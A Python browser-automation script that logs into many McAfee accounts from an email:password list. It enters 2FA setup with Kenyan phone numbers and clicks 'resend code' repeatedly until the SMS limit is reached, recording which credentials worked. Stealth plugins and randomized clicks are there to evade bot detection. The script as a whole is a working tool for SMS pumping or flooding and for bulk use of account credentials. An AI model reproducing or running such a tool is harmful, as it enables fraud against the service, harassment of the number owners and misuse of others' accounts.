import os
import time
import random
from concurrent.futures import ThreadPoolExecutor
from playwright.sync_api import sync_playwright
from undetected_playwright import stealth_sync
from loguru import logger
from threading import Lock
from tqdm import tqdm

# Global lock for thread-safe file operations
file_lock = Lock()
phone_numbers = []
phone_index = 0
phone_lock = Lock()
reuse_phone = None  # Track if we need to reuse a phone number
reuse_phone_lock = Lock()


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


def savecreated(filename, message):
    workcard = filename + '.txt'
    with open(workcard, "a", encoding="utf8") as file:
        file.writelines(message + '\n')


def get_next_phone():
    """Get next phone number from the pool in a thread-safe manner"""
    global phone_index, phone_numbers, phone_lock, reuse_phone, reuse_phone_lock

    # Check if we need to reuse a phone number
    with reuse_phone_lock:
        if reuse_phone is not None:
            phone = reuse_phone
            reuse_phone = None  # Clear after use
            return phone

    with phone_lock:
        if phone_index >= len(phone_numbers):
            phone_index = 0  # Reset to beginning if we run out
        phone = phone_numbers[phone_index]
        phone_index += 1
        return phone


def set_reuse_phone(phone):
    """Set a phone number to be reused for the next account"""
    global reuse_phone, reuse_phone_lock
    with reuse_phone_lock:
        reuse_phone = phone


def remove_phone_from_file(phone):
    """Remove a phone number from numbers.txt file"""
    try:
        with file_lock:
            with open("numbers.txt", "r", encoding="utf8") as file:
                lines = file.readlines()
            with open("numbers.txt", "w", encoding="utf8") as file:
                for line in lines:
                    if line.strip() != phone:
                        file.write(line)
            logger.info(f"Removed phone {phone} from numbers.txt (exhausted)")
    except Exception as e:
        logger.error(f"Error removing phone from file: {e}")


def human_like_click(page, locator):
    """Simulate human-like click with mouse movement and delays"""
    # Get element bounding box
    box = locator.bounding_box()
    if box:
        # Random position within the element
        x = box['x'] + box['width'] * random.uniform(0.3, 0.7)
        y = box['y'] + box['height'] * random.uniform(0.3, 0.7)

        # Move mouse to element with slight delay
        page.mouse.move(x, y)
        time.sleep(random.uniform(0.1, 0.3))

        # Click
        page.mouse.click(x, y)
    else:
        # Fallback to regular click
        locator.click()


def mcafee_login_automation(email, password, phone_number, runner_id, progress_bar):
    """
    Automates McAfee login and 2FA setup process
    """
    url = "https://home.mcafee.com/Secure/Protected/MyAccountInfo.aspx?culture=en-us&affid=0&mfa=HM91lGej3PslkEIZQpuGf0O1BGsdfKEMtIjuQAdDnLM1"

    with sync_playwright() as playwright:
        try:
            browser = playwright.chromium.launch(headless=False)  # Set to True for headless
            context = browser.new_context()
            stealth_sync(context)
            page = context.new_page()

            logger.info(f"{runner_id}: Navigating to McAfee login page...")
            page.goto(url, wait_until="domcontentloaded")
            time.sleep(3)

            # Step 1: Enter email
            logger.info(f"{runner_id}: Entering email...")
            email_input = page.locator('input[type="email"][name="email"]')
            email_input.wait_for(state="visible", timeout=15000)
            email_input.fill(email)
            time.sleep(1)

            # Step 2: Enter password
            logger.info(f"{runner_id}: Entering password...")
            password_input = page.locator('input[type="password"][name="password"]')
            password_input.fill(password)
            time.sleep(1)

            # Step 3: Click sign in button (human-like) - Fast retry mechanism
            logger.info(f"{runner_id}: Clicking sign in button (first click)...")
            sign_in_button = page.locator('button#sign-in-button[aria-label="Sign in"]')
            sign_in_button.wait_for(state="visible", timeout=5000)
            time.sleep(random.uniform(0.5, 1.5))
            human_like_click(page, sign_in_button)

            # Wait 11 seconds for sign-in button to reappear
            logger.info(f"{runner_id}: Waiting 11 seconds for sign-in button to reappear...")
            time.sleep(11)

            # Check if sign-in button appeared again and click it
            try:
                if sign_in_button.is_visible(timeout=1000):
                    logger.info(f"{runner_id}: Sign-in button reappeared, clicking again...")
                    time.sleep(random.uniform(0.5, 1.5))
                    human_like_click(page, sign_in_button)
                    time.sleep(2)
                else:
                    logger.info(f"{runner_id}: Sign-in button did not reappear, continuing...")
            except:
                logger.info(f"{runner_id}: Sign-in button did not reappear, continuing...")

            # Check for login error
            try:
                login_error = page.locator('div#login-error-id[data-testid="error-div"]')
                if login_error.is_visible(timeout=2000):
                    logger.error(f"{runner_id}: Login failed - Invalid credentials")
                    savecreated('failed', f"{email}:{password} - Login error: Invalid credentials")
                    browser.close()
                    if progress_bar:
                        progress_bar.update(1)
                    return
            except:
                pass

            # Step 4: NOW search for Enable 2FA button (only after second click attempt)
            logger.info(f"{runner_id}: Now searching for Enable 2FA button...")
            enable_2fa_button = page.locator('a#ctl00_MainContent_ctl00_m_EnableTwoFactorButtonLabel')
            enable_2fa_button.wait_for(state="visible", timeout=15000)
            logger.success(f"{runner_id}: Enable 2FA button found!")
            enable_2fa_button.click()
            time.sleep(3)

            # Step 5: Change country from Egypt to Kenya
            logger.info(f"{runner_id}: Changing country to Kenya...")
            # Click on country selector button
            country_button = page.locator('button[name="action"][value="pick-country-code"]')
            country_button.wait_for(state="visible", timeout=15000)
            country_button.click()
            time.sleep(2)

            # Search for Kenya
            logger.info(f"{runner_id}: Searching for Kenya...")
            search_input = page.locator('input[type="search"][name="with-search"]')
            search_input.wait_for(state="visible", timeout=10000)
            search_input.fill("kenya")
            time.sleep(2)

            # Click on Kenya option
            logger.info(f"{runner_id}: Selecting Kenya...")
            kenya_option = page.locator('span:has-text("Kenya (+254)")')
            kenya_option.first.click()
            time.sleep(2)

            # Step 6: Enter phone number
            logger.info(f"{runner_id}: Entering phone number...")
            phone_input = page.locator('input[name="phone"][type="text"]')
            phone_input.wait_for(state="visible", timeout=10000)
            phone_input.fill(phone_number)
            time.sleep(1)

            # Step 7: Click continue button
            logger.info(f"{runner_id}: Clicking continue...")
            continue_button = page.locator('button[name="action"][value="default"][data-action-button-primary="true"]')
            continue_button.click()
            time.sleep(3)

            # Check for IMMEDIATE alert (phone already blocked)
            try:
                immediate_alert = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
                if immediate_alert.is_visible(timeout=2000):
                    logger.warning(f"{runner_id}: Phone {phone_number} already blocked! Saving to max.txt")
                    savecreated('max', f"{email}:{password}:{phone_number} - Phone already blocked")
                    set_reuse_phone(phone_number)  # Reuse this phone for next account
                    browser.close()
                    if progress_bar:
                        progress_bar.update(1)
                    return
            except:
                pass

            time.sleep(2)

            # Step 8: Keep clicking resend until max attempts message appears
            logger.info(f"{runner_id}: Working on account, clicking resend until blocked...")
            resend_count = 0
            max_resends = 100  # Safety limit

            while resend_count < max_resends:
                # Check if max attempts message is visible FIRST (two possible locations)
                try:
                    # Check for paragraph message
                    max_attempts_msg = page.locator('p:has-text("You\'ve reached the maximum number of resend attempts")')
                    if max_attempts_msg.is_visible(timeout=1000):
                        logger.success(f"{runner_id}: Account DONE (max resend attempts reached after {resend_count} resends)")
                        savecreated('completed', f"{email}:{password}:{phone_number}")

                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
                        if resend_count >= 5:
                            remove_phone_from_file(phone_number)

                        browser.close()
                        if progress_bar:
                            progress_bar.update(1)
                        return  # Exit immediately and move to next account
                except:
                    pass

                # Also check for alert div with id="prompt-alert"
                try:
                    alert_div = page.locator('div#prompt-alert[data-error-code="too-many-sms"]')
                    if alert_div.is_visible(timeout=1000):
                        logger.success(f"{runner_id}: Account DONE (alert detected after {resend_count} resends)")
                        savecreated('completed', f"{email}:{password}:{phone_number}")

                        # If we successfully resent multiple times, remove phone from file (it's exhausted)
                        if resend_count >= 5:
                            remove_phone_from_file(phone_number)

                        browser.close()
                        if progress_bar:
                            progress_bar.update(1)
                        return  # Exit immediately and move to next account
                except:
                    pass

                # Click resend button (silently, no spam logs)
                try:
                    resend_button = page.locator('button[name="action"][value="resend-code"]')
                    if resend_button.is_visible(timeout=3000):
                        resend_button.click()
                        resend_count += 1
                        time.sleep(2)
                    else:
                        logger.warning(f"{runner_id}: Resend button not found")
                        break
                except Exception as e:
                    logger.warning(f"{runner_id}: Error clicking resend: {e}")
                    time.sleep(2)

            logger.success(f"{runner_id}: Automation completed successfully!")
            time.sleep(3)
            browser.close()
            if progress_bar:
                progress_bar.update(1)

        except Exception as e:
            logger.error(f"{runner_id}: Automation failed - {e}")
            savecreated('failed', f"{email}:{password}:{phone_number} - Error: {str(e)}")
            try:
                browser.close()
            except:
                pass
            if progress_bar:
                progress_bar.update(1)


def run_worker(index, account_data, progress_bar):
    """
    Worker function to process a single account
    """
    runner_id = f"Worker-{index + 1}"
    email, password = account_data.split(':', 1)
    phone = get_next_phone()  # Get next phone from pool

    logger.info(f"{runner_id}: Starting automation for {email} with phone {phone}")
    mcafee_login_automation(email, password, phone, runner_id, progress_bar)


if __name__ == "__main__":
    clear_console()
    logger.info("McAfee Login Automation Script")
    logger.info("=" * 50)

    # Load accounts from file (format: email:password)
    try:
        with open("accounts.txt", "r", encoding="utf8") as file:
            accounts = [line.strip() for line in file if line.strip()]
        logger.info(f"Loaded {len(accounts)} accounts from accounts.txt")
    except FileNotFoundError:
        logger.error("'accounts.txt' not found. Create a file with format: email:password")
        exit(1)

    # Load phone numbers from file
    try:
        with open("numbers.txt", "r", encoding="utf8") as file:
            phone_numbers = [line.strip() for line in file if line.strip()]
        logger.info(f"Loaded {len(phone_numbers)} phone numbers from numbers.txt")
    except FileNotFoundError:
        logger.error("'numbers.txt' not found. Create a file with phone numbers (one per line)")
        exit(1)

    if len(phone_numbers) == 0:
        logger.error("No phone numbers loaded. Please add numbers to numbers.txt")
        exit(1)

    # Ask for number of workers
    num_workers = int(input('Number of concurrent workers: '))

    # Initialize progress bar
    with tqdm(total=len(accounts), desc="Progress", unit="account") as progress_bar:
        # Execute workers
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            executor.map(lambda i: run_worker(i, accounts[i], progress_bar), range(len(accounts)))

    logger.success("Script finished!")
    input('Press Enter to exit...')
